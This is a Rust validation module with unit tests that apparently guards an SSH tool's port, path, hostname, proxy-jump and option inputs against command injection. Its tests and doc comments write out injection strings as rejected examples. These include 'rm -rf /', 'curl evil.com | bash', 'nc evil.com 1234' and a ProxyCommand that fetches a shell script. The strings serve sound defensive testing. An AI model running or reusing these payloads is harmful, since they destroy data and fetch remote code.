use crate::error::{AmberError, Result};
use std::net::IpAddr;
use std::path::Path;

/// Validates SSH port number
///
/// # Security
/// - Must be numeric only (digits 0-9)
/// - Must be in range 1-65535
/// - Prevents command injection via shell metacharacters
///
/// # Examples
/// ```ignore
/// assert!(validate_ssh_port("22").is_ok());
/// assert!(validate_ssh_port("2222").is_ok());
/// assert!(validate_ssh_port("22; rm -rf /").is_err());
/// assert!(validate_ssh_port("22 $(curl evil.com)").is_err());
/// ```
pub fn validate_ssh_port(port: &str) -> Result<u16> {
    // Remove whitespace
    let port = port.trim();

    // Check for empty string
    if port.is_empty() {
        return Err(AmberError::ValidationError(
            "SSH port cannot be empty".to_string(),
        ));
    }

    // Check for shell metacharacters that could enable injection
    let dangerous_chars = [
        '$', '`', '|', ';', '&', '\n', '\0', '(', ')', '{', '}', '<', '>', '\'', '"', '\\', '*',
        '?', '[', ']', '!', '#', '~', '%',
    ];
    if port.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::ValidationError(
            "SSH port contains invalid characters".to_string(),
        ));
    }

    // Check for whitespace (spaces, tabs) which could be used for injection
    if port.contains(char::is_whitespace) {
        return Err(AmberError::ValidationError(
            "SSH port cannot contain whitespace".to_string(),
        ));
    }

    // Must be numeric only
    if !port.chars().all(|c| c.is_ascii_digit()) {
        return Err(AmberError::ValidationError(
            "SSH port must be numeric".to_string(),
        ));
    }

    // Parse to u16 and validate range
    let port_num = port
        .parse::<u16>()
        .map_err(|_| AmberError::ValidationError("SSH port number is invalid".to_string()))?;

    if port_num == 0 {
        return Err(AmberError::ValidationError(
            "SSH port must be between 1 and 65535".to_string(),
        ));
    }

    Ok(port_num)
}

/// Validates file path for SSH identity files and config files
///
/// # Security
/// - No shell metacharacters ($, `, |, ;, &, etc.)
/// - No null bytes or newlines
/// - Path must be valid UTF-8
/// - Must be a reasonable file path
///
/// # Examples
/// ```ignore
/// assert!(validate_file_path("/home/user/.ssh/id_rsa").is_ok());
/// assert!(validate_file_path("~/.ssh/config").is_ok());
/// assert!(validate_file_path("/path; rm -rf /").is_err());
/// assert!(validate_file_path("/path$(malicious)").is_err());
/// ```
pub fn validate_file_path(path: &str) -> Result<&str> {
    // Remove leading/trailing whitespace
    let path = path.trim();

    // Check for empty string
    if path.is_empty() {
        return Err(AmberError::ValidationError(
            "File path cannot be empty".to_string(),
        ));
    }

    // Check for shell metacharacters and dangerous sequences
    let dangerous_chars = ['$', '`', '|', ';', '&', '\n', '\0', '\r'];
    if path.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::ValidationError(
            "File path contains invalid characters".to_string(),
        ));
    }

    // Check for command substitution patterns
    if path.contains("$(") || path.contains("${") || path.contains("`") {
        return Err(AmberError::ValidationError(
            "File path contains command substitution syntax".to_string(),
        ));
    }

    // Validate as a Path
    let _ = Path::new(path);

    // Additional check: path should not contain consecutive slashes (except at start for UNC paths)
    if path.contains("//") && !path.starts_with("//") {
        return Err(AmberError::ValidationError(
            "File path contains invalid consecutive slashes".to_string(),
        ));
    }

    Ok(path)
}

/// Validates hostname format (for proxy jump and other SSH options)
///
/// # Security
/// - Must be valid hostname or IP address
/// - No shell metacharacters
/// - Format: hostname, IPv4, IPv6, or user@hostname
///
/// # Examples
/// ```ignore
/// assert!(validate_hostname("example.com").is_ok());
/// assert!(validate_hostname("192.168.1.1").is_ok());
/// assert!(validate_hostname("user@bastion.example.com").is_ok());
/// assert!(validate_hostname("host; rm -rf /").is_err());
/// assert!(validate_hostname("host$(curl evil.com)").is_err());
/// ```
pub fn validate_hostname(host: &str) -> Result<&str> {
    let host = host.trim();

    // Check for empty string
    if host.is_empty() {
        return Err(AmberError::ValidationError(
            "Hostname cannot be empty".to_string(),
        ));
    }

    // Check for shell metacharacters
    let dangerous_chars = [
        '$', '`', '|', ';', '&', '\n', '\0', '\r', '(', ')', '{', '}', '<', '>', '\'', '"', '\\',
        '*', '?', '[', ']', '!', '#', '~', '%',
    ];
    if host.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::ValidationError(
            "Hostname contains invalid characters".to_string(),
        ));
    }

    // Check for whitespace
    if host.contains(char::is_whitespace) {
        return Err(AmberError::ValidationError(
            "Hostname cannot contain whitespace".to_string(),
        ));
    }

    // Check for command substitution
    if host.contains("$(") || host.contains("${") || host.contains("`") {
        return Err(AmberError::ValidationError(
            "Hostname contains command substitution syntax".to_string(),
        ));
    }

    // Split on @ to handle user@host format
    let parts: Vec<&str> = host.split('@').collect();
    let hostname_part = if parts.len() == 2 {
        // Validate username part (alphanumeric, underscore, hyphen, dot)
        let username = parts[0];
        if username.is_empty()
            || !username
                .chars()
                .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.')
        {
            return Err(AmberError::ValidationError(
                "Invalid username in hostname".to_string(),
            ));
        }
        parts[1]
    } else if parts.len() == 1 {
        parts[0]
    } else {
        return Err(AmberError::ValidationError(
            "Invalid hostname format".to_string(),
        ));
    };

    // Try to parse as IP address
    if hostname_part.parse::<IpAddr>().is_ok() {
        return Ok(host);
    }

    // Validate as hostname (RFC 1123)
    // Hostname can contain alphanumeric, hyphen, and dot
    // Must start with alphanumeric
    // Each label must be 1-63 chars
    // Total length must be <= 253 chars
    if hostname_part.len() > 253 {
        return Err(AmberError::ValidationError(
            "Hostname too long (max 253 characters)".to_string(),
        ));
    }

    let labels: Vec<&str> = hostname_part.split('.').collect();
    for label in labels {
        if label.is_empty() || label.len() > 63 {
            return Err(AmberError::ValidationError(
                "Invalid hostname label length".to_string(),
            ));
        }

        // Label must start with alphanumeric
        if !label.chars().next().unwrap().is_alphanumeric() {
            return Err(AmberError::ValidationError(
                "Hostname label must start with alphanumeric character".to_string(),
            ));
        }

        // Label can contain alphanumeric and hyphen
        if !label.chars().all(|c| c.is_alphanumeric() || c == '-') {
            return Err(AmberError::ValidationError(
                "Hostname label contains invalid characters".to_string(),
            ));
        }

        // Label cannot end with hyphen
        if label.ends_with('-') {
            return Err(AmberError::ValidationError(
                "Hostname label cannot end with hyphen".to_string(),
            ));
        }
    }

    Ok(host)
}

/// Validates proxy jump specification
///
/// # Security
/// - Format: user@host or user@host:port
/// - Validates each component
/// - No shell metacharacters
///
/// # Examples
/// ```ignore
/// assert!(validate_proxy_jump("user@bastion.example.com").is_ok());
/// assert!(validate_proxy_jump("user@bastion.example.com:2222").is_ok());
/// assert!(validate_proxy_jump("user@10.0.0.1").is_ok());
/// assert!(validate_proxy_jump("user@host; curl evil.com").is_err());
/// ```
pub fn validate_proxy_jump(proxy_jump: &str) -> Result<String> {
    let proxy_jump = proxy_jump.trim();

    // Check for empty string
    if proxy_jump.is_empty() {
        return Err(AmberError::ValidationError(
            "Proxy jump cannot be empty".to_string(),
        ));
    }

    // Check for dangerous characters first
    let dangerous_chars = [
        '$', '`', '|', ';', '&', '\n', '\0', '\r', '(', ')', '{', '}', '<', '>', '\'', '"', '\\',
        '*', '?', '[', ']', '!', '#', '~', '%',
    ];
    if proxy_jump.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::ValidationError(
            "Proxy jump contains invalid characters".to_string(),
        ));
    }

    // Split by comma for multiple jumps
    let jumps: Vec<&str> = proxy_jump.split(',').collect();

    for jump in jumps {
        let jump = jump.trim();

        // Check for port specification (user@host:port)
        let parts: Vec<&str> = jump.rsplitn(2, ':').collect();

        if parts.len() == 2 {
            // Has port specification
            let host_part = parts[1];
            let port_part = parts[0];

            // Validate hostname
            validate_hostname(host_part)?;

            // Validate port
            validate_ssh_port(port_part)?;
        } else {
            // No port specification, just validate hostname
            validate_hostname(jump)?;
        }
    }

    Ok(proxy_jump.to_string())
}

/// Sanitizes SSH option values by escaping or rejecting dangerous characters
///
/// # Security
/// - Removes or escapes shell metacharacters
/// - Prevents command injection
/// - Use for generic SSH option values
///
/// # Examples
/// ```ignore
/// assert_eq!(sanitize_ssh_option("safe_value").unwrap(), "safe_value");
/// assert!(sanitize_ssh_option("value; rm -rf /").is_err());
/// ```
pub fn sanitize_ssh_option(value: &str) -> Result<String> {
    let value = value.trim();

    // Check for empty string
    if value.is_empty() {
        return Err(AmberError::ValidationError(
            "SSH option cannot be empty".to_string(),
        ));
    }

    // Reject values with dangerous characters
    let dangerous_chars = [
        '$', '`', '|', ';', '&', '\n', '\0', '\r', '(', ')', '{', '}', '<', '>', '\'', '"', '\\',
    ];
    if value.chars().any(|c| dangerous_chars.contains(&c)) {
        return Err(AmberError::ValidationError(
            "SSH option contains invalid characters".to_string(),
        ));
    }

    // Check for command substitution
    if value.contains("$(") || value.contains("${") {
        return Err(AmberError::ValidationError(
            "SSH option contains command substitution syntax".to_string(),
        ));
    }

    let lowered = value.to_ascii_lowercase();
    let banned = ["proxycommand", "localcommand", "permitlocalcommand"];
    if banned.iter().any(|k| lowered.contains(k)) {
        return Err(AmberError::ValidationError(
            "SSH option contains forbidden directives".to_string(),
        ));
    }

    // Check for whitespace (except single spaces between words)
    if value.contains('\t') || value.contains(char::is_control) {
        return Err(AmberError::ValidationError(
            "SSH option contains invalid whitespace".to_string(),
        ));
    }

    Ok(value.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ========== SSH Port Validation Tests ==========

    #[test]
    fn test_valid_ssh_ports() {
        assert_eq!(validate_ssh_port("22").unwrap(), 22);
        assert_eq!(validate_ssh_port("2222").unwrap(), 2222);
        assert_eq!(validate_ssh_port("65535").unwrap(), 65535);
        assert_eq!(validate_ssh_port("1").unwrap(), 1);
        assert_eq!(validate_ssh_port("  22  ").unwrap(), 22); // whitespace trimmed
    }

    #[test]
    fn test_invalid_ssh_ports() {
        // Out of range
        assert!(validate_ssh_port("0").is_err());
        assert!(validate_ssh_port("65536").is_err());
        assert!(validate_ssh_port("99999").is_err());

        // Non-numeric
        assert!(validate_ssh_port("abc").is_err());
        assert!(validate_ssh_port("22a").is_err());
        assert!(validate_ssh_port("2.2").is_err());

        // Command injection attempts
        assert!(validate_ssh_port("22; rm -rf /").is_err());
        assert!(validate_ssh_port("22 -o ProxyCommand='curl http://evil.com'").is_err());
        assert!(validate_ssh_port("22$(curl evil.com)").is_err());
        assert!(validate_ssh_port("22`whoami`").is_err());
        assert!(validate_ssh_port("22|nc evil.com 1234").is_err());
        assert!(validate_ssh_port("22&whoami").is_err());
        assert!(validate_ssh_port("22\nwhoami").is_err());

        // Empty
        assert!(validate_ssh_port("").is_err());
        assert!(validate_ssh_port("   ").is_err());
    }

    #[test]
    fn test_ssh_port_shell_metacharacters() {
        let dangerous_inputs = vec![
            "22 && rm -rf /",
            "22 || curl evil.com",
            "22; echo pwned",
            "22 | bash",
            "22 > /etc/passwd",
            "22 < /etc/passwd",
            "22 $(malicious)",
            "22 `malicious`",
            "22${IFS}malicious",
            "22\nmalicious",
            "22\rmalicious",
            "22\0malicious",
        ];

        for input in dangerous_inputs {
            assert!(
                validate_ssh_port(input).is_err(),
                "Should reject: {}",
                input
            );
        }
    }

    // ========== File Path Validation Tests ==========

    #[test]
    fn test_valid_file_paths() {
        assert_eq!(
            validate_file_path("/home/user/.ssh/id_rsa").unwrap(),
            "/home/user/.ssh/id_rsa"
        );
        assert_eq!(
            validate_file_path("~/.ssh/config").unwrap(),
            "~/.ssh/config"
        );
        assert_eq!(
            validate_file_path("/etc/ssh/ssh_config").unwrap(),
            "/etc/ssh/ssh_config"
        );
        assert_eq!(
            validate_file_path("relative/path/to/file").unwrap(),
            "relative/path/to/file"
        );
        assert_eq!(
            validate_file_path("/path/with spaces/file").unwrap(),
            "/path/with spaces/file"
        );
        assert_eq!(
            validate_file_path("  /home/user/.ssh/id_rsa  ").unwrap(),
            "/home/user/.ssh/id_rsa"
        );
    }

    #[test]
    fn test_invalid_file_paths() {
        // Command injection attempts
        assert!(validate_file_path("/path; rm -rf /").is_err());
        assert!(validate_file_path("/path$(malicious)").is_err());
        assert!(validate_file_path("/path`whoami`").is_err());
        assert!(validate_file_path("/path|nc evil.com").is_err());
        assert!(validate_file_path("/path&whoami").is_err());
        assert!(validate_file_path("/path\nmalicious").is_err());
        assert!(validate_file_path("/path${IFS}malicious").is_err());

        // Empty
        assert!(validate_file_path("").is_err());
        assert!(validate_file_path("   ").is_err());
    }

    #[test]
    fn test_file_path_command_substitution() {
        let dangerous_inputs = vec![
            "/path/$(curl evil.com)",
            "/path/${malicious}",
            "/path/`malicious`",
            "$(whoami)/.ssh/key",
            "`whoami`/.ssh/key",
        ];

        for input in dangerous_inputs {
            assert!(
                validate_file_path(input).is_err(),
                "Should reject: {}",
                input
            );
        }
    }

    // ========== Hostname Validation Tests ==========

    #[test]
    fn test_valid_hostnames() {
        assert_eq!(validate_hostname("example.com").unwrap(), "example.com");
        assert_eq!(
            validate_hostname("bastion.example.com").unwrap(),
            "bastion.example.com"
        );
        assert_eq!(validate_hostname("192.168.1.1").unwrap(), "192.168.1.1");
        assert_eq!(validate_hostname("2001:db8::1").unwrap(), "2001:db8::1");
        assert_eq!(
            validate_hostname("user@bastion.example.com").unwrap(),
            "user@bastion.example.com"
        );
        assert_eq!(validate_hostname("my-host").unwrap(), "my-host");
        assert_eq!(validate_hostname("host123").unwrap(), "host123");
        assert_eq!(validate_hostname("  example.com  ").unwrap(), "example.com");
    }

    #[test]
    fn test_invalid_hostnames() {
        // Command injection attempts
        assert!(validate_hostname("host; rm -rf /").is_err());
        assert!(validate_hostname("host$(curl evil.com)").is_err());
        assert!(validate_hostname("host`whoami`").is_err());
        assert!(validate_hostname("host|nc evil.com").is_err());
        assert!(validate_hostname("host&whoami").is_err());
        assert!(validate_hostname("host\nmalicious").is_err());

        // Invalid formats
        assert!(validate_hostname("").is_err());
        assert!(validate_hostname("   ").is_err());
        assert!(validate_hostname("-invalid").is_err());
        assert!(validate_hostname("invalid-").is_err());
        assert!(validate_hostname("host name").is_err());
        assert!(validate_hostname("user@@host").is_err());

        // Too long
        let long_hostname = "a".repeat(254);
        assert!(validate_hostname(&long_hostname).is_err());

        // Invalid label length
        let long_label = format!("{}.com", "a".repeat(64));
        assert!(validate_hostname(&long_label).is_err());
    }

    #[test]
    fn test_hostname_with_user() {
        assert!(validate_hostname("user@host.com").is_ok());
        assert!(validate_hostname("user_name@host.com").is_ok());
        assert!(validate_hostname("user-name@host.com").is_ok());
        assert!(validate_hostname("user.name@host.com").is_ok());

        // Invalid usernames
        assert!(validate_hostname("@host.com").is_err());
        assert!(validate_hostname("user!@host.com").is_err());
        assert!(validate_hostname("user$@host.com").is_err());
    }

    // ========== Proxy Jump Validation Tests ==========

    #[test]
    fn test_valid_proxy_jumps() {
        assert_eq!(
            validate_proxy_jump("user@bastion.example.com").unwrap(),
            "user@bastion.example.com"
        );
        assert_eq!(
            validate_proxy_jump("user@bastion.example.com:2222").unwrap(),
            "user@bastion.example.com:2222"
        );
        assert_eq!(
            validate_proxy_jump("user@10.0.0.1").unwrap(),
            "user@10.0.0.1"
        );
        assert_eq!(
            validate_proxy_jump("bastion.example.com").unwrap(),
            "bastion.example.com"
        );
        assert_eq!(
            validate_proxy_jump("user@bastion1.com,user@bastion2.com").unwrap(),
            "user@bastion1.com,user@bastion2.com"
        );
        assert_eq!(
            validate_proxy_jump("  user@bastion.example.com  ").unwrap(),
            "user@bastion.example.com"
        );
    }

    #[test]
    fn test_invalid_proxy_jumps() {
        // Command injection attempts
        assert!(validate_proxy_jump("user@host; curl evil.com").is_err());
        assert!(validate_proxy_jump("user@host$(malicious)").is_err());
        assert!(validate_proxy_jump("user@host:22; rm -rf /").is_err());
        assert!(validate_proxy_jump("user@host:22|nc evil.com").is_err());

        // Invalid formats
        assert!(validate_proxy_jump("").is_err());
        assert!(validate_proxy_jump("   ").is_err());
        assert!(validate_proxy_jump("user@host:abc").is_err()); // Invalid port
        assert!(validate_proxy_jump("user@host:65536").is_err()); // Port out of range
    }

    #[test]
    fn test_proxy_jump_multiple_hops() {
        // Valid multiple hops
        assert!(validate_proxy_jump("user@jump1.com,user@jump2.com").is_ok());
        assert!(validate_proxy_jump("user@jump1.com:2222,user@jump2.com:3333").is_ok());

        // Invalid multiple hops
        assert!(validate_proxy_jump("user@jump1.com,malicious;rm -rf /").is_err());
    }

    // ========== SSH Option Sanitization Tests ==========

    #[test]
    fn test_valid_ssh_options() {
        assert_eq!(sanitize_ssh_option("value").unwrap(), "value");
        assert_eq!(
            sanitize_ssh_option("value-with-hyphen").unwrap(),
            "value-with-hyphen"
        );
        assert_eq!(
            sanitize_ssh_option("value_with_underscore").unwrap(),
            "value_with_underscore"
        );
        assert_eq!(sanitize_ssh_option("value123").unwrap(), "value123");
        assert_eq!(
            sanitize_ssh_option("value with spaces").unwrap(),
            "value with spaces"
        );
        assert_eq!(sanitize_ssh_option("  value  ").unwrap(), "value");
    }

    #[test]
    fn test_invalid_ssh_options() {
        // Command injection attempts
        assert!(sanitize_ssh_option("value; rm -rf /").is_err());
        assert!(sanitize_ssh_option("value$(malicious)").is_err());
        assert!(sanitize_ssh_option("value`whoami`").is_err());
        assert!(sanitize_ssh_option("value|nc evil.com").is_err());
        assert!(sanitize_ssh_option("value&whoami").is_err());
        assert!(sanitize_ssh_option("value\nmalicious").is_err());
        assert!(sanitize_ssh_option("value${IFS}malicious").is_err());
        assert!(sanitize_ssh_option("value'malicious'").is_err());
        assert!(sanitize_ssh_option("value\"malicious\"").is_err());
        assert!(sanitize_ssh_option("value\\malicious").is_err());
        assert!(sanitize_ssh_option("-o ProxyCommand=evil").is_err());
        assert!(sanitize_ssh_option("ProxyCommand=evil").is_err());
        assert!(sanitize_ssh_option("LocalCommand=evil").is_err());

        // Empty
        assert!(sanitize_ssh_option("").is_err());
        assert!(sanitize_ssh_option("   ").is_err());
    }

    // ========== Integration Tests ==========

    #[test]
    fn test_realistic_attack_scenarios() {
        // Scenario 1: Port with ProxyCommand injection
        assert!(validate_ssh_port("22 -o ProxyCommand='curl http://evil.com/shell|sh'").is_err());

        // Scenario 2: Identity file with command substitution
        assert!(validate_file_path("/home/user/.ssh/$(whoami)_rsa").is_err());

        // Scenario 3: Proxy jump with shell redirect
        assert!(validate_proxy_jump("user@host > /tmp/pwned").is_err());

        // Scenario 4: Multiple attack vectors combined
        assert!(validate_proxy_jump("user@host:22; curl evil.com | bash").is_err());
    }

    #[test]
    fn test_edge_cases() {
        // Edge case: Very long port number
        assert!(validate_ssh_port("999999999999999999").is_err());

        // Edge case: Unicode characters in hostname
        assert!(validate_hostname("host\u{200B}.com").is_err()); // Zero-width space

        // Edge case: Null byte injection
        assert!(validate_file_path("/path/\0/file").is_err());
    }
}
